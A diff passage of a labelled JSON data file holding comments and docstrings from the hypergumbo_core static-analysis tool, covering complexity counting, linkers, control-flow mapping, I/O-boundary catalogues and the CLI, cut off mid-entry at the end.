    "text": "Nim: tree-sitter-nim reuses keyword strings (`if`/`for`/`while`/`case`/\n`try`) as BOTH named construct nodes AND anonymous keyword tokens with the\nsame `.type`, so counting those primaries would double-count (same\ncollision class as perl `elsif`, haskell `case`). The collision-free arm\nnodes are counted instead: `elif_branch` (own condition), `of_branch`\n(case arm), `except_branch` (try handler). `else_branch`/`finally_branch`\nexcluded. Conservative: a lone if/for/while with no elif/of/except reports\nCC=1. and/or short-circuit via `infix_expression` (added below)."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/cyclomatic.py",
    "text": "Haxe: this grammar is degenerate — `else if`/do-while/try do not parse,\nand for/while have NO dedicated node type (they surface only as a generic\n`keyword` node, deliberately NOT counted to avoid over-counting). So only\n`conditional_statement` (if) and `case_statement` (switch arms incl.\ndefault) are counted; loops are uncounted (CC still non-null). &&/|| are\nnamed `operator` children unreachable by the scan — no short-circuit."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/cyclomatic.py",
    "text": "Elm (pure functional): `if_else_expr` is FLAT — an entire if/else-if/else\nchain is ONE node (conservatively counts once, like Hack's flat\nif_statement); a nested if elsewhere is its own node. `case_of_branch` =\neach case-of arm incl. the `_` wildcard (the case_of_expr/`case` wrappers\nare NOT counted). &&/|| are named operator children — no short-circuit."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/cyclomatic.py",
    "text": "Agda: DEGENERATE grammar (like haxe/tcl-for). Its `if_then_else_` /\n`case_of_` / `&&` / `||` are ordinary mixfix identifiers (atom>qid nodes),\nindistinguishable from any function application — there is NO decision-point\nnode type to count, and no binary-expr node for short-circuit. The empty\nset yields base CC=1 for every callable (non-null, satisfying INV-loguk).\nAlso: the analyzer emits the type-signature node (single line), not the\nclause body, so CC is structurally base-1 regardless."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/cyclomatic.py",
    "text": "Wolfram: DEGENERATE grammar — If/While/For/Switch/Which/Do are ordinary\n`call` nodes (head + brackets), indistinguishable from any function call,\nso there is no countable decision-point node type (empty set, like agda).\nCC derives solely from short-circuit &&/|| (named `infix` nodes, added to\n_BINARY_EXPR_NODE_TYPES below); an If-heavy function with no &&/|| is base 1."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/cyclomatic.py",
    "text": "Elixir: control forms are ``call`` nodes whose first named child is an\n``identifier`` head (``if``/``cond``/``case``/...). Module-qualified calls\n(``Enum.map``) have a ``dot`` first child (not ``identifier``) -> no head\n-> skipped. and/or/&&/|| are ``binary_operator`` nodes (NOT calls), so the\nhead walker skips them — conservative v1, matching the spec. The analyzer\nemits one Symbol PER def clause, so no cross-clause aggregation is needed."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/cyclomatic.py",
    "text": "Short-circuit operator detection. tree-sitter exposes the\noperator as an anonymous (unnamed) child of the binary\nexpression — its text is the literal operator string (e.g.\n``&&``). We scan the immediate children and bump complexity\nonce per matching operator child. Decoding is best-effort: a\nnon-UTF-8 source slice is skipped silently so the walker never\nraises on malformed input."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/selection_index.py",
+   "text": "Shrink ``run_set`` to ``keep`` plus everything not safely droppable.\n\n``keep`` is the FILE-TOUCH set — every test observed executing any block of\na changed file, not merely the changed blocks — because the local coverage\ngate is whole-file. ``droppable`` is the set the index can speak about.\nAnything in ``run_set`` and outside ``droppable`` survives regardless."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/linkers/grpc.py",
+   "text": "The node id of the symbol this linker mints for *pattern*.\n\nWI-fotad: ADR-0036 Ruling 2 puts ``node.kind`` in the kind slot and the\nnode's own language in the language slot; this linker used to put the\nframework role and the literal ``grpc`` there. The role is kept as a\nname-segment suffix, as the websocket linker does (INV-dulah), so a\nservicer and a registration of one service at one line, or a node this\nlinker mints and the analyzer's own node for the same declaration, keep\ndistinct ids."
+  },
+  {
+   "label": 1,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/meta_write_discipline.py",
+   "text": "Every node in *scope*, NOT descending into a nested function.\n\n``_scopes`` returns the module plus every function, and the intent is that\neach is examined on its own. But ``ast.walk`` from the MODULE reaches into\nevery function body, so a name bound in one function and a subscript in\nanother are both \"in the module scope\" — which re-creates the exact\nmodule-wide false positive ``_scopes`` was introduced to kill.\n\nFound by a test written for the alias rule (INV-hazov (a)) and true of rule\n3 as well: the leak was latent there, surviving only because no module in\nthe tree happened to pair a meta-bearing construction in one function with\na wholesale ``.meta`` replacement in another. One walker for both rules, so\nthe boundary is defined once rather than depended upon twice."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/discovery.py",
+   "text": "Match path segments against pattern segments, with ``**`` spanning any.\n\nEach non-``**`` pattern segment fnmatches exactly one path segment, so\n``*`` never crosses a ``/``. This is ``rglob``'s rule once the caller\nprefixes the pattern with ``**`` (INV-kalaj)."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/sketch.py",
+   "text": "Non-blank lines of a text file (:func:`profile.sloc_of_text`); 0 for a\nbinary file or one that cannot be read. The sniff is read first, so a\nlarge binary is never read whole."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/linkers/registry.py",
+   "text": "Status of a single linker requirement.\n\nAttributes:\n    name: Requirement identifier\n    description: Human-readable description\n    count: Number of matching items found (0 = unmet)\n    met: True if count > 0\n    languages: The requirement's ``LinkerRequirement.languages``"
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/yaml_catalogs.py",
+   "text": "Return findings where a family's extensibility answer is incoherent.\n\nADR-0047 ruling 7: the gate \"refuses a family that declares a channel it\ndoes not have\". Being REQUIRED makes the fields answer the question; these\nchecks make the answer mean something. Each is a shape that would otherwise\nship a channel users cannot reach, or a claim of internality contradicted\nby the spec beside it."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/cli.py",
+   "text": "ADR-0047 ruling 9's offer, wrapped so it can never break a run.\n\nAn offer is a courtesy. A courtesy that raises out of ``main`` and turns a\nsuccessful analysis into a traceback is strictly worse than no offer, so\nevery failure here is swallowed — the user simply is not asked, which is\nthe pre-feature behaviour and is never wrong. The command's ``path``, when\nit took one, is handed over so the offer is not made while the analysed\nrepository overlaps the destination (INV-kuroj)."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/framework_patterns.py",
+   "text": "Framework pattern matching for symbol enrichment (ADR-3aaa).\n\nThis module provides data-driven framework detection using YAML pattern files.\nInstead of hardcoding framework-specific logic in analyzers, patterns are\nexternalized to YAML files that match against symbol metadata.\n\nHow It Works\n------------\n1. Each framework has a YAML file in src/hypergumbo_core/frameworks/ (e.g., fastapi.yaml)\n2. Patterns match against symbol metadata (decorators, base_classes, annotations)\n3. When a pattern matches, the symbol is enriched with a \"concept\" (route, model, etc.)\n4. Linkers use concepts to understand symbol semantics without framework knowledge\n\nAlso provides:\n\n- Eleven language-convention pattern files (``_CONVENTION_PATTERN_IDS``:\n  main-functions, test-frameworks, library-exports, naming-conventions, ...)\n  that ``enrich_symbols`` applies on every repo regardless of framework\n  detection.\n- A user-channel override: a file in the user's ``frameworks.d`` channel whose\n  stem matches a framework id (or its alias) replaces the shipped YAML whole\n  rather than merging into it (ADR-0047 ruling 10, ``load_framework_patterns``).\n- Route-marker hygiene at enrichment: on a symbol that already carries a\n  route marker, a redundant path-less ``route`` concept is dropped and its\n  framework lifted onto ``route_framework`` (``_dedup_route_marker_concepts``,\n  INV-vokak), and on any route-family marker a ``library_export`` match is\n  dropped (``_drop_library_export_on_route_marker``, INV-liraj).\n- Route-path composition inside ``enrich_symbols``: an APIRouter\n  ``router_prefix`` is prepended to the symbol's route paths, a pattern's\n  ``prefix_from_parent`` combines a method's path with its parent class's\n  concept path (``_combine_route_paths``), and JAX-RS subresource-locator paths\n  are chained through the locator methods that return a resource class\n  (``_apply_subresource_locator_paths``).\n- Pipeline passes run outside ``enrich_symbols``:\n  ``resolve_deferred_symbol_refs`` (resolves UsageContext handler references\n  against the full symbol table once every analyzer has run),\n  ``strip_test_file_only_concepts`` (drops ``is_test_file: false`` concepts\n  from symbols supply-chain classification marked as test code),\n  ``materialize_route_symbols`` and ``expand_class_based_view_routes`` (see\n  below).\n\nPattern Types\n-------------\n**Definition-based (v1.0.x+):** Match against symbol definition metadata.\n\n- Decorator patterns: Match function/method decorators (e.g., @app.get)\n- Base class patterns: Match class inheritance (e.g., BaseModel), or a\n  method's parent class bases (parent_base_class + method_name)\n- Annotation patterns: Match Java annotations (e.g., @RequestMapping)\n- Parameter type patterns: Match function parameter types (e.g., Depends)\n- Further fields: symbol_name, symbol_kind, language, framework_role,\n  meta_match, modifiers/modifiers_exclude and symbol_path (plus an\n  is_test_file policy flag)\n\n**Usage-based (v1.1.x):** Match against UsageContext records for call-based\nframeworks where routing is done via function calls rather than decorators.\n\n- Usage patterns: Match UsageContext kind/name/position (e.g., Django path(),\n  Flask add_url_rule(), Go gin.GET())\n- Extraction expressions: Pull route paths and methods from UsageContext metadata\n\nRelationship to Route Symbols\n-----------------------------\nEnrichment adds ``concept: route`` to *handler* symbols (e.g., a Django view\nfunction gets tagged as a route handler). This is complementary to — not a\nreplacement for — route-marker symbols. Route symbols are first-class IR\nentities representing the route itself, consumed by the ``route_handler``\nlinker to create ``dispatches_to`` edges. Language analyzers create route\nmarkers directly for routing DSLs and constructor-style routing (Go, JS/TS,\nDjango urls.py, Starlette ``Route``, Flask-RESTful ``add_resource``, Rails,\nPhoenix, Laravel, Swift, Play ``conf/routes``).\nFor handlers enriched with ``concept: route`` that have no marker (decorator\nand annotation frameworks such as JAX-RS, Spring, ASP.NET, FastAPI),\n``materialize_route_symbols`` creates the marker.\n``expand_class_based_view_routes`` splits a Django CBV ``ANY`` route into one\nroute per declared HTTP method. Handler enrichment comes from definition\nmetadata or from UsageContext records, depending on the pattern.\n\nWhy This Design\n---------------\n- Separation of concerns: Analyzers extract metadata, patterns add semantics\n- Extensibility: New frameworks added by creating YAML files, no code changes\n- Maintainability: Framework-specific logic is centralized and declarative\n- Testing: Patterns can be validated independently of analyzer code\n\nUsage\n-----\n    from hypergumbo_core.framework_patterns import enrich_symbols\n\n    # Enrich symbols in place with matched framework concepts. Pass the set of\n    # detected framework ids directly; enrich_symbols loads each framework's\n    # YAML patterns internally (signature: enrich_symbols(symbols,\n    # detected_frameworks, usage_contexts=None, report=None); ``report``\n    # collects per-pattern-YAML gain counts, WI-tivif).\n    enriched = enrich_symbols(symbols, detected_frameworks)"
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/cfg.py",
+   "text": "Complete CFG node mapping for a language.\n\nLoaded from ``cfg_nodes/<language>.yaml``. Maps tree-sitter node types\nto generic control-flow categories that the CFG builder understands."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/analyze/registry.py",
+   "text": "The ``Edge.origin`` tokens that name an ANCHORED PRODUCER of *language*.\n\nADR-0057 §14's origin condition asks whether a resolved edge carries a\nsecond INDEPENDENT OBSERVER of the call site. ``origin`` is the pass-id\naxis, so the question is answered by asking which origin tokens belong to\nan anchored producer rather than to a derived pass — a linker's resolution\nof a stub is a refinement of one observation, not a second one (§13 case\n2). Empty when the language has fewer than two anchored producers, which\nis what makes §14's registry gate redundant rather than load-bearing.\n\nTWO SPELLINGS, and the second one is DECLARED (INV-gabak). Almost every\nproducer's records carry its registration name, but the two SCIP arms\nregister as ``rust_analyzer`` / ``scip_python`` and emit ``scip``, because\nthe translation that emits them is shared by both arms and is a pass in\nits own right — ``catalog._SYNTHETIC_PASS_IDS`` declares it as one, per\nADR-0044. Each such producer states that in ``emits_origin``; ``None``\nmeans \"the registration name\", which is the truth for everyone else.\n\nThis first read :attr:`RegisteredAnalyzer.backend`, which happens to spell\n``scip`` for both arms. That was the right answer off the wrong field:\n``backend`` is the PARSING BACKEND label, \"decoupled from pass_id so the\nID stays stable across backend swaps\", so a backend swap or a producer\nwhose two labels differ would have disarmed the rule with no error — and\nit admitted the incumbent's ``ast`` as a Python producer token. Does not\ntrigger discovery; call :func:`ensure_discovered` first."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/sketch_embeddings.py",
+   "text": "Get the XDG cache base directory for hypergumbo.\n\nReturns ~/.cache/hypergumbo/ following XDG Base Directory Specification.\nUses XDG_CACHE_HOME if set, otherwise defaults to ~/.cache.\n\nReturns:\n    Path to the hypergumbo cache base directory."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/slice.py",
+   "text": "Raised when entry spec matches multiple symbols in different files.\n\nThis error helps users disambiguate by showing the matching candidates\nwith their file paths and node IDs.\n\nAttributes:\n    entry_spec: The entry specification that was ambiguous.\n    candidates: List of Symbol objects that matched."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/linkers/cgo.py",
+   "text": "Build a multi-value lookup table from function name to C/C++ symbols.\n\nMaps bare function names to all matching C/C++ symbol definitions.\nMulti-value indexing surfaces cross-file collisions (e.g. two C files\neach declaring ``MyFunc`` — common with static / inline linkage or\nduplicate-include compile-time errors that the static analyzer\nhappily indexes) so INV-zuhub fallback annotation can downgrade the\nresulting cgo bridge edges.\n\nCgo can call functions from both C (.c) and C++ (.cpp) files, as long\nas C++ functions use ``extern \"C\"`` linkage."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/ddg_build.py",
+   "text": "The block's TAIL EXPRESSION as a return, where the language returns it.\n\nWI-sodoj. Rust returns a block's last expression when it carries no ``;``:\n``fn get() -> String { env::var(\"TOOL\").unwrap() }`` is its idiomatic\nreturn, so most Rust helpers had no return statement for the INV-komoj\nlift to see. A language opts in with ``block_tail_returns: true`` in its\ncfg mapping. The tail is the last named child that is not a statement\n(``*_statement``, ``*_declaration``, ``*_item``) -- in tree-sitter-rust a\n``;`` makes an ``expression_statement``. Comments are skipped."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/linkers/js_module.py",
+   "text": "Infrastructure linker: JS/TS module resolution for cross-file import edges.\n\nThe JS/TS analyzer creates `imports` edges with synthetic dst IDs like\n'javascript:./utils:0-0:module:module' where the import path is embedded\nin the ID string. These edges are orphaned because no symbol has that ID.\n\nThis linker resolves those import paths to actual files on disk, reuses the\ncanonical `kind=\"file\"` symbol for each resolved target, whatever its language\n(minting one with the `make_file_id` id when none exists), and creates two\ntypes of edges.\n\nA minted target node carries the TARGET's own language (`taxonomy.get_language`),\nnever the importer's (WI-babuk): `.ts` importing `./util.js` mints\n`javascript:src/util.js`, and an imported image or font is a real file with no\nsource language, so `language=None` with the importer's language as\n`discovery_language` and in the id's language slot (ADR-0036). Labelled with the\nimporter's language, imported binaries were parsed as JavaScript downstream\n(crypto-flow-linker never finished on nextjs). The edges are:\n\n1. `imports` - from the importing file symbol to the target file symbol\n   (file-level dependency; ADR-0023 §6 Phase 3 folded the former\n   `imports_module` type away, and consumers recover that specialization\n   from `dst.kind == 'file'`)\n2. `module_exports` - from the target file symbol to each function, method,\n   class, getter, setter or constructor that the file EXPORTS (enabling\n   cross-file reachability). \"Exports\" is the analyzer's positive verdict,\n   ``Symbol.is_exported is True`` (ESM ``export``; CommonJS\n   ``module.exports`` / ``exports.x``). WI-sinol: the kind filter alone sent\n   the edge to class members and private helpers too (14 of 26 edges false\n   on the htrac frontend), telling a consumer that ``ItemList.render`` is\n   importable. ``False`` and ``None`` (no verdict) both withhold the edge;\n   a class member is reached through its exported class.\n\nTogether these create a traversable path:\n  file_A --imports--> file_B --module_exports--> functionInB\n\nFor npm packages (bare/scoped imports like 'lodash', '@vue/test-utils'),\nthe linker creates `kind=\"package\"` symbols carrying\n`meta['package_ecosystem'] == 'npm'` and `imports` edges to them.\n\nA bare specifier whose package a `package.json` IN THE TREE declares (an npm\nworkspace sibling, `require('@ws/b')`) is not a third-party package: it\nresolves to that package's entry file -- `exports[\".\"]`, `module` or `main`,\nelse its index -- or, for a subpath (`@ws/b/util`), to the file the subpath\nnames (`_build_workspace_package_index` / `_resolve_workspace_import`,\nWI-rilof). Before, it became a tier-3 \"third-party\" stand-in beside the real\ntier-1 package.\n\nPath Alias Resolution\n---------------------\nNon-relative imports that aren't npm packages may be project aliases:\n- **tsconfig.json paths**: `@/*` -> `./src/*` (Next.js, Vite, Angular)\n- **Vite resolve.alias**: `dashboard` -> `./app/javascript/dashboard`\nThe linker reads these config files at startup and expands aliases before\nresolving to files. ``_build_tsconfig_alias_index`` indexes every\ntsconfig.json / jsconfig.json outside node_modules by directory, following\neach one's ``extends`` chain (up to ``_MAX_EXTENDS_DEPTH``) for inherited\n``paths`` / ``baseUrl``; an importing file uses the nearest ancestor\ndirectory's aliases (``_get_aliases_for_file``), so monorepo packages keep\ntheir own. Vite aliases come only from the repo root and are merged in,\nlongest prefix first. This handles 68% of GrowthBook's TS imports and 33%\nof Chatwoot's JS imports.\n\nFile Extension Probing\n----------------------\nWhen an import path has no extension (e.g., './utils'), we probe in order:\n  .js, .ts, .jsx, .tsx, .mjs, .mts, .vue, .json\nAlso checks for directory index files: {dir}/index.{ext}\n\nWhy This Matters\n----------------\nOn Chatwoot, 9,192 import edges exist but 0% resolve to known nodes.\n3,023 JS functions/methods are orphaned primarily because their files\nare imported by other files but no cross-file edges exist. This linker\ncreates the cross-file edge chain needed to de-orphan them."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/pass_silence.py",
+   "text": "Render the one-line silence summary, or ``None`` when none is due.\n\nReturns ``None`` when no pass was silent for a reason outside\n:data:`ROUTINE_SILENCE_REASONS`, so a run with nothing worth a look\ngenerates no chatter — the same discipline as\n``spec_validator.emit_stderr_summary``, which is silent on a clean run.\nThe routine passes are counted, not named, at the end of the line, so\nthe share of each named reason among all silent passes (ADR-0054 T1)\ncan still be read off it.\n\nReasons are ordered most-common-first, ties broken alphabetically, so the\nline is DETERMINISTIC across runs and two surveys can be diffed without\nspurious churn (the elixir non-determinism of WI-jozap is a standing\nreminder that arbitrary iteration order is a measurement hazard, not a\ncosmetic one).\n\nThe line names where to look rather than only that a problem exists: a\nreader who sees a non-zero ``unreported`` needs the per-pass detail in\n``analysis_runs[].silence_reason`` to act on it."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/cli.py",
+   "text": "Installed dependency source (a content rule with packages). Its own\nbuild output is a dependency's, so the derived scan never enters it."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/linkers/http.py",
+   "text": "Fold a ``String.join \"/\" [...]`` parts list into a URL path\n(WI-rosan / WI-mugog).\n\nThin Elm-specific wrapper around the generalised ``fold_array_join``\nengine from the ``url_folding`` package. The ``\"/\"`` separator is read\nfrom ``url_folding/array_join.yaml`` so a future Clojure / Lisp variant\ncan declare its own separator without touching this function.\n\nReturns the URL (``\"/silence/{uuid}\"``, ``\"/alerts\"``) or ``None`` when\nthe list has fewer than two items (no path segments after the base URL)."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/verify_claims.py",
+   "text": "The request-handler list the unseeded-ingress disclosure reads (WI-vumig).\n\nA map written since this existed carries ``request_ingress``: every\nrequest-handler candidate BEFORE ``detect_entrypoints`` applies its rank\nfloor and its size cap. ``entrypoints`` is a ranked OVERVIEW, floored at\n``MIN_ENTRYPOINT_CONFIDENCE`` and capped by repo size with a 40% per-kind\nshare, and a completeness statement read off it was silently partial: on\nmlflow the capped list held 200 of 302 route handlers, and the\ndisclosure named 254 production handlers where the full list gives it\n320. An older map has no such\nkey and the capped list is all there is, so that is read: partial, but\nno handler invented. The key's PRESENCE decides -- an empty list is the\npositive statement that the detector found no request handler."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/install_steps.py",
+   "text": "Copy-paste install steps for the opt-in backends' external binaries.\n\nThe two SCIP backends run programs hypergumbo does not ship: ``scip-python``\n(an npm package) and ``rust-analyzer`` (a rustup component). hypergumbo does\nnot install either for the user — a global npm prefix and a Rust toolchain\nare machine-level choices — so when one is missing, the next best thing is\nthe exact commands that install it, in order, ready to paste into a\nterminal, plus a reference page for the reader who wants the background.\n\n\"Exact\" is the point, and it is why the steps are computed rather than\nfixed. A single canned line was wrong for real machines: ``npm install -g``\nfails without root wherever npm's global prefix is ``/usr``; ``rustup\ncomponent add`` cannot help a user without rustup; and a binary installed\ninto a folder that is not on ``PATH`` looks exactly like a binary that is\nnot installed, because every probe resolves it through ``shutil.which``.\nSo each renderer looks at the machine first — which of ``npm`` / ``rustup``\nresolve, whether ``~/.local/bin`` is on ``PATH``, whether rustup sits in\n``~/.cargo/bin`` unseen — and emits only the steps that machine still needs.\nThe looking is lookups only (``which``, an environment read, one\n``Path.is_file``): rendering advice runs no program.\n\nChoices the steps make, and why:\n\n* scip-python goes into ``~/.local`` with ``npm install -g --prefix``, which\n  needs no root and puts the binary in ``~/.local/bin`` — the folder pipx\n  already uses for hypergumbo itself, so it is usually on ``PATH`` already.\n* Node.js, when absent, comes from nvm at a pinned release: one route that\n  needs no root on Linux and macOS and yields a Node new enough for\n  scip-python (which requires Node 16 or newer).\n* rustup comes from its official installer one-liner, as the Rust book\n  gives it.\n\nThe commands are POSIX-shell; on Windows the renderers say so and point at\nthe references instead of pretending."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/cfg.py",
+   "text": "Find a child node using a YAML child reference.\n\nReferences use a prefix to specify the lookup strategy:\n- ``field:name`` → ``node.child_by_field_name(\"name\")``\n- ``type:name`` → first child with ``.type == \"name\"``\n- ``unfielded`` → first named child that carries no field name;\n  ``unfielded:except=a,b`` skips children of types ``a`` and ``b``.\n  Go's ``for x < n {}`` gives its bare condition no field.\n- bare ``name`` (no prefix) → field lookup first, then type fallback\n\nTwo combinators, so a grammar that nests a header one level down can\nstill be mapped in YAML (WI-losod):\n- ``a/b`` resolves ``b`` against the node ``a`` found (Go's\n  ``type:for_clause/field:initializer``)\n- ``a|b`` is the first of the alternatives that resolves"
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/io_boundary.py",
+   "text": "Return True when this catalogue has ENUMERATED ``module``'s I/O surface.\n\nTHE ONE PREDICATE ANY CONSUMER SHOULD ASK BEFORE TREATING SILENCE AS\nEVIDENCE. \"No chains found in M\" is an examined negative only if M's\nI/O was enumerated; otherwise it means \"none I could see\". Two adjacent\npredicates were used for that question and neither answers it:\n\n- :meth:`is_stdlib_module` answers \"do I recognise this name\". It\n  permitted ``telnetlib``, ``ssl`` and ``ctypes`` — zero rows apiece —\n  into a ``confirmed`` verdict (INV-buzab).\n- Row PRESENCE (\"the catalogue declares some primitive for M\") answers\n  \"have I catalogued ANY of M's I/O\", which vouches for the rest of the\n  module and for every OTHER boundary kind at once. ``os`` carries 40\n  rows and none of them is ``os.open`` / ``os.write`` / ``os.sendfile``,\n  so a program writing through ``os.open`` confirmed \"never writes to\n  the host filesystem\" (INV-zubuh).\n\nMATCHING IS EXACT. Not a prefix, not a suffix, not a component. An\nearlier draft let a declaration propagate DOWN a separator — declaring\n``urllib`` would vouch for ``urllib.request`` — on the reasoning that a\nclosed-world claim about a package covers what is addressed through its\nname. That reasoning is wrong in at least three shipped languages and\nthe draft's own worked example was one of the counterexamples:\n\n- ``urllib`` is a NAMESPACE package. ``urllib.request`` (opens URLs),\n  ``urllib.parse`` (pure string work) and ``urllib.error`` are\n  independent modules with unrelated I/O surfaces. Auditing one says\n  nothing about the others, so the example promoted an unaudited\n  network module on the strength of a string.\n- In Go the separator is not containment at all. ``crypto/tls``,\n  ``os/exec`` and ``math/rand`` are independent packages; a declaration\n  for ``math`` would have vouched for ``math/rand``, and one for ``os``\n  for ``os/exec`` — the subprocess surface.\n- Rust and C++ namespace with ``::``, which the separator list did not\n  even contain, so the rule was simultaneously too loose for Go and\n  inert for Rust. A rule that is wrong in one direction for one\n  language and absent for another is not one rule.\n\nSo an auditor declares every module they actually audited, submodules\nincluded, and the predicate never infers a second module from a first.\nThat is more authoring per unit of confirmability and it is the only\nversion that means what it says.\n\nNOR IS IT A SUFFIX, which is the other half of the safety argument.\n:func:`_module_matches` — the boundary TAGGER's rule — matches trailing\ncomponents when the catalogue row is the longer side, so a bare\n``unix`` slot finds the ``golang.org/x/sys/unix`` row (a slot with MORE\nleading components than the row is a different owner, WI-mujod). The two stay separate on purpose: the tagger is permissive\nbecause a missed tag loses a finding, while this gate is strict because\na wrong permit manufactures a false all-clear. Unifying them toward the\ntagger would make a cosmetic module-string respell a security-relevant\nedit.\n\nAn empty ``module_completeness`` therefore means \"nothing has\nbeen enumerated\", and every module blocks. That is the correct starting\nstate for a catalogue nobody has audited, and it is the state MOST\nshipped catalogues are in. A HARDCODED COUNT DECAYS: this sentence read\n\"13 of the 14 shipped catalogues\" while fifteen shipped, and rust's\nWI-lutuh audit then moved the numerator too. Ask the catalogues.\n\nBOTH CONSUMERS OF THE CLOSED-WORLD CLAIM COME THROUGH HERE, because\nthey are asking one question and a second home for it would drift. This\nreplaced ``is_stdlib_module_complete``, whose sole caller was the F3\nFilter 2 ``external_potential`` skip — which asks the identical thing\n(\"is an unmatched call into this module provably not I/O\") and\ntherefore wants the identical answer. With exact matching the two are\nbehaviourally identical, so the fold carries no behaviour change at\nall; it removes the second home rather than trading one rule for\nanother."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/cfg.py",
+   "text": "Process a deferred execution statement (e.g., Go defer).\n\nRecords the deferred node for insertion at function exit.\nCreates a statement block for the defer keyword itself."
+  },
+  {
+   "label": 1,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/axis_meta_keys.py",
+   "text": "Meta keys whose value varies BY CALL SITE (INV-vukiv).\n\n``ir.deduplicate_edges`` keeps one edge per ``(src, dst, edge_type)``. For\nevery key named here the survivor may carry the value only if EVERY\ncollapsed site agreed on it; otherwise the singular key is dropped and the\ndistinct values move to ``<name>_values``. The rule is not new — INV-fubag\ngave ``call_arg_shape`` exactly this treatment, hardcoded, because a\n\"every argument here is a literal\" proof asserted from one of several sites\nsilences real flows. What was missing was any way to DECLARE a second key,\nwhich is why ``io_mode`` (one producer, many sites) quietly deleted real\n``fs_write`` boundaries for as long as it did.\n\nRead by ir.py rather than owned by it: the registry is where a key's\ncontract lives, and putting the list in the dedup function would make the\nnext per-site key someone adds invisible to it — the same \"second home for\none fact\" shape this module exists to prevent."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/sketch_embeddings.py",
+   "text": "Warn ONCE per process that semantic enhancement is being skipped.\n\nOnce, not per call site: six consumers degrade independently and a\nper-consumer warning would bury the sketch it is attached to. The remedy is\nnamed because \"couldn't connect to huggingface.co\" tells a user what failed\nbut not what to do about it."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/linkers/route_handler.py",
+   "text": "Resolve Phoenix controller/action to a handler symbol.\n\nArgs:\n    controller: Controller module name like \"UserController\" or\n        LiveView module name like \"HomeLive\"\n    action: Action function name like \"index\", or LiveView action\n        like \"page\"/\"mount\"\n    symbol_by_name: Lookup table of symbols by name\n    is_live: Whether this is a Phoenix LiveView route. If True,\n        falls back to resolving the module itself when\n        ``controller.action`` isn't found (LiveView modules handle\n        actions via ``handle_params/3``, not per-action functions).\n\nReturns:\n    Matching Symbol or None"
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/cli.py",
+   "text": "Command-line interface for hypergumbo.\n\nThis module provides the main entry point for the hypergumbo CLI, handling\nargument parsing and dispatching to the appropriate command handlers.\n\nHow It Works\n------------\nThe CLI uses argparse with subcommands for different operations:\n\n- **sketch** (default): generate a token-budgeted Markdown overview.\n- **survey**: run the full analysis and output the survey JSON (behavior map).\n  ``run`` is a deprecated alias kept for one minor-version window (ADR-0042).\n- **Graph queries**: ``slice`` (subgraph from an entry point), ``search``,\n  ``routes``, ``explain``, ``symbols``, ``compact``, ``io-boundaries``,\n  ``verify-claims``, ``repeat-finder``, ``dead-code-maybe``, ``test-coverage``.\n- **Introspection**: ``catalog`` (analysis passes), ``catalog-inventory``,\n  ``config``, ``cache-status`` / ``cache-clear``.\n- **Setup**: ``build-grammars`` (Lean/Wolfram/Circom), ``install-gitleaks`` /\n  ``uninstall-gitleaks``, ``install-rust-analyzer`` / ``uninstall-rust-analyzer``\n  (SCIP-backed Rust backend, WI-dotud), ``install-embeddings`` /\n  ``uninstall-embeddings``, ``add-extras`` / ``remove-extras``,\n  ``init-catalogs`` (scaffold the user catalogue channels, ADR-0047),\n  ``trust-backend`` (record a per-repo backend opt-in, ADR-0045),\n  ``trust-catalogues`` (record a per-repo opt-in to the repository's own\n  catalogue data, ADR-0061),\n  ``backend-agreement`` (measure two backends' agreement from an\n  artifact's provenance slot, ADR-0057 §5).\n\nThe authoritative set is derived from the parser itself —\n``_registered_subcommands(build_parser())`` — not a hand-maintained literal.\n\nWhen no subcommand is given, sketch mode is assumed. This makes the\ncommon case (`hypergumbo .`) as simple as possible.\n\nThe `survey` command (``run_survey``) builds the unified behavior map in\nthis order:\n\n0. **Indexing** (ADR-0004): one ``FileIndex`` walk shared by profile\n   detection, the analyzers and the 